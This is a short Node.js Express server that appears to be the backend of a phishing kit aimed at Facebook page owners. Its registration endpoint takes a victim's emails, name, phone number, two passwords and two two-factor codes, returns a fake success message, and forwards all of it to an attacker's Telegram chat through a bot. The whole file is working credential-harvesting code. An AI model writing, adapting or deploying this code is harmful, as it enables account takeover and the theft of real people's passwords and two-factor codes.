import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));
app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

app.post('/api/resgister', (req, res) => {
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    
    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
------------------------
<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
------------------------
<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;

    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });

});

app.listen(process.env.PORT, () => {
    console.log(`Server listening port ${process.env.PORT}`);
});
